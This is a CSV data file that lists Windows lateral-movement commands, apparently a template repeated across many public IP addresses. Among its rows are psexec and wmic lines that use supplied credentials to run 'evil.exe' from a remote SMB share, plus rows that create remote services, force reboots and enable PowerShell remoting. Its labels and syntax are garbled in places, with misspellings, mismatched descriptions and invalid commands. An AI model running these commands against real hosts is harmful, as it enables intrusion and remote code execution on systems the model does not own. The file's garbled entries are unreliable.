Exename,commandline,description,category
net.exe,net use z: \\ 154.66.173.171 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 154.66.173.171 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
psexec.exe,psexec /accepteula \\ 154.66.173.171 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 208.168.243.90 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 208.168.243.90 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 208.168.243.90 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 208.168.243.90 /v,Remote process listing,WINDOWS REMOTING
xcopy.exe,xcopy /s \\ 208.168.243.90 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\81.248.22.100 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\81.248.22.100 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 81.248.22.100,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\81.248.22.100,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 81.248.22.100,Remote filesystem (IPC$),WINDOWS REMOTING
psexec.exe,psexec /accepteula \\ 81.248.22.100 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 81.248.37.11 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 81.248.37.11 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 81.248.37.11 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 81.248.37.11 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 81.248.37.11 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 81.248.37.11 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 81.248.37.11 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 81.248.37.11 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 81.248.37.11 GET remotefile,TFTP file transfer,NETWORK INFO
net.exe,net use \\ 72.27.160.60,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 72.27.160.60 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 72.27.160.60 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 72.27.160.60 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 127.0.0.1 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 127.0.0.1 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 127.0.0.1 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 208.91.197.27 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 208.91.197.27 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 208.91.197.27 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 208.91.197.27 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 208.91.197.27 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 208.91.197.27 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 208.91.197.27 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 208.91.197.27 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 208.91.197.27 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 208.91.197.27 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 208.91.197.27 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\52.175.39.99 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\52.175.39.99 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 52.175.39.99,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\52.175.39.99,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 52.175.39.99,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 52.175.39.99 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 52.175.39.99 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 52.175.39.99 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 52.175.39.99 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 52.175.39.99 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 52.175.39.99 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 40.112.64.87 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 40.112.64.87 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 40.112.64.87 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 40.112.64.87 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 40.112.64.87 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 40.112.64.87 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 40.112.64.87 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 40.112.64.87 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 40.112.64.87 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 40.112.64.87 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 40.112.64.87 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\13.81.218.185 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\13.81.218.185 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 13.81.218.185,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\13.81.218.185,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 13.81.218.185,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 13.81.218.185 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 13.81.218.185 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 13.81.218.185 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 13.81.218.185 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 13.81.218.185 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 13.81.218.185 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 13.81.218.185 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 13.81.218.185 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 13.81.218.185 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 13.81.218.185 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 13.81.218.185 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 13.81.218.185 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 13.81.218.185 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 13.81.218.185 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 13.81.218.185 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 13.81.218.185 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 13.81.218.185 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\104.210.48.12 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\104.210.48.12 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 104.210.48.12,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\104.210.48.12,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 104.210.48.12,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 104.210.48.12 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 104.210.48.12 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 104.210.48.12 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 104.210.48.12 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 104.210.48.12 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 104.210.48.12 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
reg.exe,reg add \\ 104.210.48.12 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 104.210.48.12 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 104.210.48.12 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 104.210.48.12 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 104.210.48.12 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 104.210.48.12 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 104.210.48.12 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 104.210.48.12 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 104.210.48.12 \dir C:\local,Copy remote folder,WINDOWS REMOTING
reg.exe,reg add \\ 45.248.64.126 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 45.248.64.126 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 45.248.64.126 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 45.248.64.126 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 45.248.64.126 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 103.252.142.21 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 103.252.142.21 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 103.252.142.21 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 103.252.142.21 \dir C:\local,Copy remote folder,WINDOWS REMOTING
reg.exe,reg add \\ 43.229.95.19 \ regkej \ value,Add registry key remotely,WINDOWS REMOTING
reg.exe,reg query\\ 43.229.95.19 \ RegDomain \ Key /v,Query remote registry,WINDOWS SYSTEMINFO
sc.exe,sc \\ 43.229.95.19 create service,Create a remote service,WINDOWS REMOTING
shutdown.exe,shutdown /m \\ 43.229.95.19 /r /t 0 /f,Remotely reboot machine ,WINDOWS REMOTING
systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote system info,WINDOWS SYSTEMINFO
systeminfo.exe,systeminfo /S 43.229.95.19 /U domain\user /P Pwd,Remote systeminfo,WINDOWS REMOTING
tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS SYSTEMINFO
tasklist.exe,tasklist /S 43.229.95.19 /v,Remote process listing,WINDOWS REMOTING
tftp.exe,tftp -I 43.229.95.19 GET remotefile,TFTP file transfer,NETWORK INFO
wmic.exe,"wmic /node: 43.229.95.19 /user:domain\user /password:password process call create ""\\smbiP\share\evil.exe""",Execute file hosted over SMB on remote system with specified credentials,WMIC COMMANDS
xcopy.exe,xcopy /s \\ 43.229.95.19 \dir C:\local,Copy remote folder,WINDOWS REMOTING
at.exe,"at \\43.229.95.19 time ""Powershell -Command 'Enable-PSRemoting -Force'"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
at.exe,"at \\43.229.95.19 time+1 ""Powershell -Command 'Set-Item wsman:\localhost\client\trustedhosts ''"" ",TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net share \\ 43.229.95.19,Shares of remote computer,WINDOWS REMOTING
net.exe,net time \\43.229.95.19,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 43.229.95.19,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net time \\142.93.221.91,TUm ON POWERSHELL REMOTING (WITH VALID CREDENTIALS) ,POWERSHELL 
net.exe,net use \\ 142.93.221.91,Remote filesystem (IPC$),WINDOWS REMOTING
net.exe,net use z: \\ 142.93.221.91 \share password,Map drive specified,WINDOWS REMOTING
netsh.exe,netsh interface 142.93.221.91 set address local dhcp,Set interface to use DHCP ,NETWORK INFO
netsh.exe,netsh interface 142.93.221.91 show interfaces,List interface IDs/MTUs,NETWORK INFO
psexec.exe,psexec /accepteula \\ 142.93.221.91 -s cmd.exe,RUN REMOTE COMMAND AS SYSTEM,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 142.93.221.91 -u Domain\user -p Lt1 C:\Progr-1,RUN REMOTE COMMAND WITH SPECIFIED HASH,PSEXEC REMOTING
psexec.exe,psexec /accepteula \\ 142.93.221.91 -u domain\user -p password -c -f \\ smbiP \share\file.exe,EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS,PSEXEC REMOTING
